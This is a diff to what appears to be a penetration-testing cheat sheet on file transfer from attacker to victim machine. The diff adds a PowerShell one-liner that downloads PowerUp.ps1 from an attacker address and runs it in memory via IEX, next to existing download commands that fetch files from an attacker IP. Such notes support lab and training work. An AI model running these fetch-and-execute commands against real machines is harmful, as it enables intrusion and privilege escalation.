@@ -24,6 +24,7 @@ From the victim machine you can use any browser you want to navigate to the IP a
 - `Invoke-WebRequest http://$attacker_address/$filename -O $output-filename`
 
 - `powershell.exe -c (Start-BitsTransfer -Source "http://$attacker_ip/$filename -Destination C:\temp\$filename")`
+- `powershell IEX(New-Object Net.WebClient).downloadString('http://$atttacker_ip$:8080/PowerUp.ps1')`
 
 ### SSH
 
